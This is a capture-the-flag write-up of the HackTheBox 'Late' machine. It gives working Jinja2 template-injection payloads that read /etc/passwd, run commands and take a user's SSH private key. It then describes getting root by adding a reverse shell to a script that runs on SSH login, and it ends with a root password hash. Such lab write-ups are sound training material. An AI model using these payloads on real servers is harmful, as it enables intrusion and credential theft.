# HackTheBox - Late

## NMAP

```bash
Nmap scan report for 10.10.11.156
Host is up (0.14s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


## PORT 80 (HTTP)

On port 80 it's nginx hosting a web page having a domain `images.late.htb`

<img src="https://i.imgur.com/evcrfB1.png"/>

<img src="https://i.imgur.com/8mcfyy0.png"/>

Let's add the domain name in `/etc/hosts` file

<img src="https://i.imgur.com/flHcBKo.png"/>

<img src="https://i.imgur.com/wv1EgOh.png"/>

So here let's try uploading an image with a text and see if it actually converts the image into text form

<img src="https://i.imgur.com/PodDzYJ.png"/>

I grabbed this image for the test and after uploading, we get a file name `results.txt` with the image text

<img src="https://i.imgur.com/sVFID89.png"/>

## Foothold

We can now try to test for SSTI since this a flask application as the main page says, jinja2 is normally used for templates, we can try `{{7*'7'}}`  and if it returns 7777777 then it's vulnerable to SSTI and is using jinja2 else it would return 49 if it would be using twig 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection

So to make this work, we can take a screenshot of `{{7*'7'}}` on a text editor and save it as an image

<img src="https://i.imgur.com/YSromP7.png"/>

<img src="https://i.imgur.com/rX25Rdv.png"/>

It works, now it's time to test for command execution. We can use this payload to test if we can can read files

<img src="https://i.imgur.com/jWl1y7w.png"/>

```bash
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

```

After uploading this we get the `/etc/passwd` file

<img src="https://i.imgur.com/ZCqQx2L.png"/>

Now we can't get a reverse shell from where even tho we can execute commands with 

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

Which would return us 

<img src="https://i.imgur.com/J0BujLE.png"/>

Instead we can grab the ssh key for `svc_acc`

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/svc_acc/.ssh/id_rsa').read() }}
```

<img src="https://i.imgur.com/ZMbjm7x.png"/>

<img src="https://i.imgur.com/9enwoWJ.png"/>

After getting shell, we can check what's running in the background for that we can use `pspy`

<img src="https://i.imgur.com/3hstUUU.png"/>

<img src="https://i.imgur.com/ZkOhugq.png"/>

On looking at the script it looks like a normal ssh alert which is sent to root'users mail but if we notice in pspy that script is being executed whenever we login through ssh

<img src="https://i.imgur.com/XpvyPlJ.png"/>

So we just need to add shell commands to it and it will be executed, so I'll be adding a bash reverse shell

<img src="https://i.imgur.com/J22tBZ6.png"/>

After logging in back the script will be executed and we'll have our reverse shell as root user

<img src="https://i.imgur.com/K0f7Hr7.png"/>

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection
- https://www.geeksforgeeks.org/chattr-command-in-linux-with-examples/

```

root:$6$a6J2kmTW$cHVk8PYFcAiRyUOA38Cs1Eatrz48yp395Cmi7Fxszl/aqQooB.6qFmhMG1LYuHJpGvvaE1cxubWIdIc1znRJi.:19089:0:99999:7:::
```
